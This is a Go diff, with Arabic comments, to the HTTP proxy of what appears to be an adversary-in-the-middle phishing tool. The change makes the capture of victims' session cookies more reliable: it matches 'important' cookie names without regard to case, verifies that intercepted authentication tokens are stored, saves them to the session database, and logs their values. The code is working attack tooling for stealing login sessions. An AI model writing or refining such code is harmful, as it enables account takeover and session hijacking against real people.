@@ -989,8 +989,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						isImportantCookie := false
 						
 						for _, cookieName := range importantCookies {
-							if ck.Name == cookieName {
+							// تعديل المقارنة لتجاهل حالة الأحرف
+							if strings.ToLower(ck.Name) == strings.ToLower(cookieName) {
 								isImportantCookie = true
+								// طباعة تفاصيل إضافية للتشخيص
+								log.Debug("وجدت كوكي مهم: %s (اسم ملف تعريف الارتباط الأصلي: %s)", cookieName, ck.Name)
 								break
 							}
 						}
@@ -1009,29 +1012,53 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							
 							// للكوكيز المهمة، نؤكد بشكل خاص على إضافتها باستخدام الدالة الصحيحة
 							if isImportantCookie {
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-								log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s", ck.Name, ck.Value, c_domain)
-							} else {
-								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-							}
-							
-							// طباعة محتوى CookieTokens بعد الإضافة
-							log.Debug("CookieTokens بعد الإضافة: %d domains", len(s.CookieTokens))
-							
-							// حفظ الكوكيز في قاعدة البيانات فورًا
-							log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
-							
-							// للكوكيز المهمة، طباعة معلومات إضافية للتأكد من حفظها
-							if isImportantCookie {
-								log.Debug("حفظ الكوكي المهم %s في قاعدة البيانات (المجال: %s)", ck.Name, c_domain)
+								added := s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								if added {
+									log.Debug("تم إضافة كوكي مهم: %s = %s إلى المجال: %s بنجاح", ck.Name, ck.Value, c_domain)
+								} else {
+									log.Error("فشل في إضافة كوكي مهم: %s إلى الجلسة", ck.Name)
+								}
 								
-								// حفظ الكوكيز في قاعدة البيانات
+								// طباعة محتوى CookieTokens بعد الإضافة
+								if _, ok := s.CookieTokens[c_domain]; ok {
+									tokens := s.CookieTokens[c_domain]
+									log.Debug("CookieTokens بعد الإضافة: domain %s يحتوي على %d كوكيز", c_domain, len(tokens))
+									// التحقق من وجود الكوكي المهم
+									if token, exists := tokens[ck.Name]; exists {
+										log.Debug("تم العثور على الكوكي المهم %s في CookieTokens: %s", ck.Name, token.Value)
+									} else {
+										log.Error("لم يتم العثور على الكوكي المهم %s في CookieTokens بعد الإضافة!", ck.Name)
+									}
+								}
+								
+								// حفظ الكوكيز في قاعدة البيانات فورًا
+								log.Debug("محاولة حفظ الكوكيز في قاعدة البيانات للجلسة: %s", ps.SessionId)
+								
+								// محاولة الحفظ الفوري للكوكيز المهمة
 								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 									log.Error("database: فشل في حفظ الكوكي المهم %s: %v", ck.Name, err)
 								} else {
 									log.Success("[%d] تم حفظ الكوكي المهم في قاعدة البيانات بنجاح: %s = %s", ps.Index, ck.Name, ck.Value)
+									
+									// التحقق من حفظ الكوكي
+									sess, err := p.db.GetSessionBySid(ps.SessionId)
+									if err != nil {
+										log.Error("فشل استرجاع الجلسة من قاعدة البيانات: %v", err)
+									} else {
+										// التحقق من وجود الكوكي في الجلسة المحفوظة
+										if tokens, ok := sess.CookieTokens[c_domain]; ok {
+											if _, exists := tokens[ck.Name]; exists {
+												log.Success("تم التأكد من حفظ الكوكي المهم %s في قاعدة البيانات", ck.Name)
+											} else {
+												log.Error("لم يتم العثور على الكوكي المهم %s في قاعدة البيانات بعد الحفظ!", ck.Name)
+											}
+										}
+									}
 								}
 							} else {
+								// إضافة الكوكيز العادية
+								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+								
 								// حفظ الكوكيز العادية في قاعدة البيانات
 								if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 									log.Error("database: %v", err)
